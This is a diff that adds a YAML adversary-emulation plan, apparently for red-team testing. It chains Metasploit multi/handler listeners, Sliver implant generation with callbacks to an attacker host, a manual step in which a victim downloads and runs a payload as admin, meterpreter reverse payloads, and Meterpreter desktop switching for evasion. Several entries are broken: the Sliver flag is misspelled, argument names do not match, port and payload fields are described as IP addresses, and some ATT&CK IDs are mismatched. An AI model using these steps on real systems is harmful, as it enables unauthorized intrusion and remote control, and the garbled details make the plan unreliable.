@@ -1,0 +1,223 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-08 01:13:49 UTC+0000
+attack_action_sequence:
+  - uuid: 08f66886-0e96-455b-be31-b0af37db8e23
+    name: Set a universal payload handler using MSF exploit/multi/handler module
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - Windows Command Shell
+      - Ingress Tool Transfer
+      - Non-Standard Por
+    description: |
+      In Metasploit, the exploit/multi/handler module is essentially a universal payload handler.
+      Unlike most exploit modules in Metasploit that target specific vulnerabilities, multi/handler does not exploit a particular service or software.
+      Instead, its main purpose is to listen for incoming connections from payloads that you have already delivered to a target by some other means.
+    execution:
+      executor: Metasploit Executor
+      command: |
+        exploit_and_execute_payload(target = None,
+                                    exploit_module_name = "exploit/multi/handler",
+                                    payload_module_name = "#{payload_name}",
+                                    listening_host = "#{LHOST}",
+                                    listening_port = "#{LPORT}"):
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      payload_name:
+        default:
+        description: payload type set by msf
+        type:
+  - uuid: 0e67b73a-9927-43e1-8f64-04d38f1db57d
+    name: Build Sliver implant
+    id: T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mlts --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        type:
+  - uuid: 19301991-c518-46ca-a622-378e1be4f1ad
+    name: Simulate the victim download and execute malicious payload file as Admin
+      (Root)
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{PATH} as Admin (Root)
+    arguments:
+      HOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        type:
+  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
+    name: Execute a Sliver Implant Payload
+    id: T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+  - uuid: 861580a4-aad7-4269-94ea-43f3f775423d
+    name: Metasploit Payload Execution using Sliver
+    id:
+      - T1203
+    source: Sliver
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    tactics:
+      - Execution
+    technique:
+      - Exploitation for Client Execution
+    description: The command is used within a Sliver session to execute a Metasploit
+      payload in the current process. It allows users to specify various options such
+      as the encoder type, number of encoding iterations, listening host and port,
+      payload type, and command timeout. By default, it uses the "meterpreter_reverse_https"
+      payload, listens on port 4444, and has a timeout of 60 seconds. This command
+      is typically used for penetration testing and security assessments to deploy
+      payloads on target systems.
+    execution:
+      executor: Sliver Executor
+      command: |
+        msf(#{SessionID}, #{Payload}, #{LHOST}, #{LPORT})
+    arguments:
+      SessionID:
+        default:
+        description: The session ID of the active Sliver connection.
+        type:
+      Payload:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: IP address of the attacker machine
+        type:
+  - uuid: b9fe1645-bc7e-4743-86dc-7dbee3431e16
+    name: Execute Payload windows-meterpreter_reverse_http
+    id:
+    source: Metasploit
+    supported_platforms:
+      - 
+    tactics:
+      - 
+    technique:
+    description:
+    execution:
+    arguments:
+      - target
+      - sessionID
+  - uuid: 7d5e9f3a-8b2c-41a3-9c8d-f1e9b3a7c2e1
+    name: Enumerate Desktops
+    id:
+      - T1018
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      Remote System Discovery
+    description: The `enumdesktops` command lists available desktop sessions on Windows
+      systems.
+    execution:
+      executor: Meterpreter Executor
+      command: enumdesktops (#{meterpreter_sessionid})
+    arguments:
+      meterpreter_sessionid:
+        description: The Meterpreter session ID of the active Metasploit connection
+  - uuid: b5c3d9a2-7e4f-4a1d-8c3b-6f2e5a1d0b9c
+    name: Desktop Context Switching
+    id:
+      - T1078
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Defense Evasion
+    technique: |
+      Hidden Window
+    description: The `setdesktop` command switches between desktop contexts.
+    execution:
+      executor: Meterpreter Executor
+      command: setdesktop (#{desktop_name},#{meterpreter_sessionid})
+    arguments:
+      desktop_name:
+        description: Target desktop identifier (e.g. winsta0\default)
+      meterpreter_sessionid:
+        description: The Meterpreter session ID of the active Metasploit connection
+testbed_requirement:
+  OS: []
+  CVE: []
